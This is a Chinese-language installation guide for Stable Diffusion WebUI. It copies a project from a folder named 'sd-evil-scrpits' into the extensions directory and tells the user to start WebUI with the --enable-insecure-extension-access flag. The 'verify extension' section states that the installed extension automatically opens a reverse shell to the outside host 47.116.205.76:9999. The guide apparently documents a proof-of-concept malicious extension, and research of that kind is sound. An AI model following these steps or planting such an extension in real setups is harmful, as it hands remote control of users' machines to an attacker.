# Stable Diffusion WebUI 本地安装指南

## 快速安装

运行安装脚本：

```bash
cd /Users/pyn3rd/tools/sd-evil-scrpits
./setup_sd.sh
```

## 手动安装步骤

### 1. 克隆 Stable Diffusion WebUI

```bash
cd ~
git clone https://github.com/AUTOMATIC1111/stable-diffusion-webui.git
cd stable-diffusion-webui
```

### 2. 安装扩展

```bash
# 创建扩展目录
mkdir -p extensions/my-project3

# 复制当前项目到扩展目录
cp -r /Users/pyn3rd/tools/sd-evil-scrpits/* extensions/my-project3/
```

### 3. 下载模型 Checkpoint

下载 Stable Diffusion 模型文件到 `models/Stable-diffusion/` 目录：

**推荐模型：**
- **v1-5-pruned-emaonly.safetensors** (约 4GB)
- 下载地址：https://huggingface.co/runwayml/stable-diffusion-v1-5

**其他可选模型：**
- SDXL: https://huggingface.co/stabilityai/stable-diffusion-xl-base-1.0
- 其他社区模型：https://civitai.com/

### 4. 启动 WebUI

```bash
cd ~/stable-diffusion-webui
./webui.sh --enable-insecure-extension-access
```

**重要：** 必须添加 `--enable-insecure-extension-access` 参数以避免 AssertionError。

### 5. 访问 WebUI

启动后，在浏览器中访问：
- 本地：http://127.0.0.1:7860
- 网络：http://你的IP:7860

## 验证扩展安装

1. 启动 WebUI 后，进入 **Extensions** 标签页
2. 点击 **Installed** 子标签
3. 找到 **my-project3** 扩展
4. 点击 **Apply and restart UI** 重启

扩展安装后会自动执行反弹shell连接到 `47.116.205.76:9999`。

## 故障排除

### 如果遇到 AssertionError

确保启动时添加了 `--enable-insecure-extension-access` 参数：

```bash
./webui.sh --enable-insecure-extension-access
```

### 如果扩展未加载

1. 检查扩展目录：`extensions/my-project3/`
2. 确认文件结构正确
3. 查看 WebUI 控制台错误信息
4. 重启 WebUI

### 如果模型未加载

1. 确认模型文件在 `models/Stable-diffusion/` 目录
2. 文件格式：`.safetensors` 或 `.ckpt`
3. 文件大小：通常 2-7GB

## 系统要求

- **Python**: 3.10.6 或更高版本
- **内存**: 至少 8GB RAM
- **存储**: 至少 10GB 可用空间（模型文件约 4GB）
- **GPU**: 推荐 NVIDIA GPU（可选，CPU 也可运行但较慢）

## 依赖安装

WebUI 会自动安装所需依赖，首次启动可能需要较长时间。

如果需要手动安装：

```bash
cd ~/stable-diffusion-webui
python3 -m venv venv
source venv/bin/activate
pip install torch torchvision torchaudio
```

